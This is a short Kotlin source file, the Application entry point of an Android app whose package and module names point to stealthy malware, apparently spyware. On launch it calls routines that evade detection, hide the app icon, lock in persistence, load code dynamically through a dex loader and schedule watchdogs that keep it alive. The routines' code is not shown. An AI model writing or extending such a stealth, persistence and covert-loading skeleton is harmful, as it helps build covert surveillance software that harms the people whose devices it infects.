package com.sp.core

import android.app.Application
import com.sp.core.stealth.AntiDetect
import com.sp.core.stealth.IconHider
import com.sp.core.stealth.Persistence
import com.sp.loader.DexLoader
import com.sp.watchdog.WatchdogAlarm
import com.sp.watchdog.WatchdogJob

class App : Application() {
    override fun onCreate() {
        super.onCreate()
        AntiDetect.guard(this)
        IconHider.hide(this)
        Persistence.lockIn(this)
        DexLoader.launch(this)
        WatchdogAlarm.arm(this)
        WatchdogJob.schedule(this)
    }
}